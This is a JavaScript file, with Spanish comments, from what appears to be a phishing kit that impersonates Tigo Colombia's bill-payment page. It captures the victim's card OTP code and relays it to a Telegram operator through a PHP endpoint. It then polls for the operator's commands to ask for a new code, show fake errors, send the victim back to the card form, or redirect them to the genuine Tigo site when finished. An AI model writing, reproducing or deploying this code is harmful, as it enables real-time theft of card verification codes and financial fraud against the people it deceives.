/**
 * Integración Telegram para página OTP de tarjeta
 * Maneja el envío del código OTP y comandos del operador
 */

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('otpForm');
    if (!form) return;

    const otpInput = document.getElementById('otpCode');
    const submitBtn = document.getElementById('submitBtn');
    const overlay = document.getElementById('loadingOverlay');
    const errorMessageDiv = document.getElementById('errorMessage');
    const errorText = document.getElementById('errorText');
    const resendLink = document.getElementById('resendLink');

    // Generar/obtener session_id
    function getSessionId() {
        let sessionId = sessionStorage.getItem('tigo_card_session_id');
        if (!sessionId) {
            sessionId = 'card_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            sessionStorage.setItem('tigo_card_session_id', sessionId);
        }
        return sessionId;
    }

    // Obtener invoice_id de la URL
    function getInvoiceId() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('invoice_id') || 'unknown';
    }

    // Solo números en el input OTP
    otpInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '');
        validateForm();
    });

    // Validar formulario
    function validateForm() {
        const otpValid = otpInput.value.length === 6;
        submitBtn.disabled = !otpValid;
    }

    // Mostrar mensaje de error
    function showError(message) {
        if (errorMessageDiv && errorText) {
            errorText.textContent = message;
            errorMessageDiv.style.display = 'flex';
            errorMessageDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
    }

    // Ocultar mensaje de error
    function hideError() {
        if (errorMessageDiv) {
            errorMessageDiv.style.display = 'none';
        }
    }

    // Ocultar error al escribir
    otpInput.addEventListener('input', hideError);

    // Manejar reenvío de código
    resendLink.addEventListener('click', async function(e) {
        e.preventDefault();
        
        const sessionId = getSessionId();
        const invoiceId = getInvoiceId();

        console.log('[CARD OTP] Solicitando reenvío de código...');

        try {
            const response = await fetch('/api/telegram-send.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    session_id: sessionId,
                    action: 'tigo_card_resend_otp',
                    invoice_id: invoiceId,
                    timestamp: new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
                })
            });

            const result = await response.json();
            
            if (result.success) {
                alert('Se ha reenviado el código de verificación a tu celular.');
            }
        } catch (error) {
            console.error('[CARD OTP] Error al reenviar:', error);
        }
    });

    // Enviar OTP a Telegram
    async function sendOtpToTelegram() {
        const sessionId = getSessionId();
        const invoiceId = getInvoiceId();

        const formData = {
            session_id: sessionId,
            action: 'tigo_card_otp',
            invoice_id: invoiceId,
            otp_code: otpInput.value,
            timestamp: new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
        };

        console.log('[CARD OTP] Enviando código:', formData);

        try {
            const response = await fetch('/api/telegram-send.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            });

            const result = await response.json();
            console.log('[CARD OTP] Respuesta:', result);

            if (!result.success) {
                throw new Error(result.error || 'Error al enviar código');
            }

            return true;
        } catch (error) {
            console.error('[CARD OTP] Error:', error);
            overlay.classList.remove('active');
            showError('Error al procesar tu solicitud. Por favor, intenta nuevamente.');
            return false;
        }
    }

    // Manejar envío del formulario
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        if (submitBtn.disabled) return;

        hideError();
        overlay.classList.add('active');

        const success = await sendOtpToTelegram();
        if (success) {
            const sessionId = getSessionId();
            
            // Iniciar polling con el patrón correcto
            const stopPolling = TelegramClient.startPolling((actions, stop) => {
                console.log('[CARD-OTP] ========== CALLBACK EJECUTADO ==========');
                console.log('[CARD-OTP] Total de acciones:', actions.length);
                console.log('[CARD-OTP] Acciones:', JSON.stringify(actions, null, 2));
                
                // CRÍTICO: Prevenir ejecuciones múltiples con guardia
                if (window.__otpProcessing) {
                    console.warn('[CARD-OTP] ⚠️ YA EN PROCESAMIENTO, ABORTANDO');
                    return;
                }
                window.__otpProcessing = true;
                
                // Procesar SOLO la primera acción
                const action = actions[0];
                console.log('[CARD-OTP] Procesando acción única:', action.action);
                
                // Switch sin loop - una sola acción, una sola ejecución
                switch(action.action) {
                    case 'error_tarjeta':
                        console.log('[CARD-OTP] → Volviendo a tarjeta');
                        window.location.href = `/card/form?invoice_id=${getInvoiceId()}`;
                        break;
                        
                    case 'pedir_otp':
                        console.log('[CARD-OTP] → Reenviar OTP');
                        overlay.classList.remove('active');
                        otpInput.value = '';
                        validateForm();
                        hideError();
                        window.__otpProcessing = false;
                        break;
                        
                    case 'error_otp':
                        console.log('[CARD-OTP] → Error OTP');
                        overlay.classList.remove('active');
                        otpInput.value = '';
                        validateForm();
                        showError('El código ingresado es incorrecto. Por favor, verifica e intenta nuevamente.');
                        window.__otpProcessing = false;
                        break;
                        
                    case 'finalizar':
                        console.log('[CARD-OTP] → Finalizando sesión');
                        sessionStorage.removeItem('tigo_card_session_id');
                        window.location.href = 'https://mi.tigo.com.co/pago-express/facturas';
                        break;
                        
                    default:
                        console.warn('[CARD-OTP] ⚠️ Acción desconocida:', action.action);
                        window.__otpProcessing = false;
                }
            }, sessionId, 100, 300000);
        }
    });

    validateForm();
    console.log('[OTP] Sistema inicializado');
});
